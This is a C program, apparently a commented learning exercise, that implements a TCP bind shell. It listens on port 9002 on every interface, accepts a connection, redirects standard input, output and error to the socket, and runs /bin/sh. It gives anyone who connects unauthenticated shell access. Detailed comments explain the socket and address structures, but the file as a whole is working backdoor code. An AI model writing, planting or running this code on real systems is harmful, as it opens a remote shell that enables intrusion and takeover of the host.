#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>

#define BIND_PORT 9002

int main(){

	int socket_fd; //to store file descriptor
	/*
		AF_INET => AF-> Address Family
		AF_INET => is used for addressing socket that can be used
			   to communicate over a network

		SOCK_STEAM => STREAM SOCKETS over TCP
		SOCK_DGRAM => DATAGRAM SOCKETS over UDP
	*/

	// A successful socket() call returns an integer value or else -1
	socket_fd = socket(AF_INET,SOCK_STREAM,0);

	if ( socket_fd == -1){
		printf("\nError occured; Cannot connet to socket\n");
		return -1;
	}else{
		printf("\nSuccessfully executed socket() call\n");
		setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int));
		/*
			Structure of sockaddr_in at /usr/include/netinet/in.h

				struct sockaddr_in{
    				__SOCKADDR_COMMON (sin_);
    				in_port_t sin_port;      // Port number.
    				struct in_addr sin_addr; // Internet address. 
   				unsigned char sin_zero[sizeof (struct sockaddr) - __SOCKADDR_COMMON_SIZE - sizeof (in_port_t) - sizeof (struct in_addr)];
  			};


			In Simplified version

			struct sockaddr_in{
				short int sin_family;
				unsigned short int sin_port;
				struct in_addr sin addr;
				unsigned char sin_zero[8];

			}
		*/
		struct sockaddr_in my_addr;
		my_addr.sin_family = AF_INET;
		my_addr.sin_port = htons(BIND_PORT); // PORT to Listen ON
		my_addr.sin_addr.s_addr = INADDR_ANY;// will be available over all interfaces and not limited to particular IP / Interface
		memset(&(my_addr.sin_zero),'\0',8);// Fill the structure with NULLs for padding

		//bind will return a valid integer value , -1 means error
		int bind_fd;
		bind_fd = bind(socket_fd,(struct sockaddr *)&my_addr,sizeof(struct sockaddr));

		if( bind_fd == -1){
			printf("\nCannot bind!\n");
			return -1;
		}else{
			printf("\nSuccessfully Binded and size of sockaddr is %d\n",sizeof(struct sockaddr));
			printf("\nSize of sin family-%d , sin_port-%d , sin_addr.s_addr-%d, sin_zero-%d\n",sizeof(my_addr.sin_family),sizeof(my_addr.sin_port),sizeof(my_addr.sin_addr.s_addr),sizeof(my_addr.sin_zero));
			//listen for incoming connection
			listen(socket_fd,2);

			struct sockaddr_in their_addr;
			int sin_size,recvfd;
			sin_size = sizeof(struct sockaddr_in);
			printf("\nSize of sockaddr is %d\n",sizeof(struct sockaddr_in));
			recvfd = accept(socket_fd,(struct sockaddr *)&their_addr,&sin_size);
			if(recvfd == -1){
				printf("\nError in receiving connection\n");
				return -1;
			}else{
				printf("\nReceived an incoming connection\n");
				//close(socket_fd);
				//https://stackoverflow.com/questions/16185919/redirecting-output-of-server-to-client-socket


				// Redirect IO to stdout, stderror
    				dup2(recvfd, 0);
    				dup2(recvfd, 1);
    				dup2(recvfd, 2);
				//close(socket_fd);
    				// Execute shell
    				execl("/bin/sh", "sh", NULL);
				close(socket_fd);
			}

		}


	}
	return 0;
}

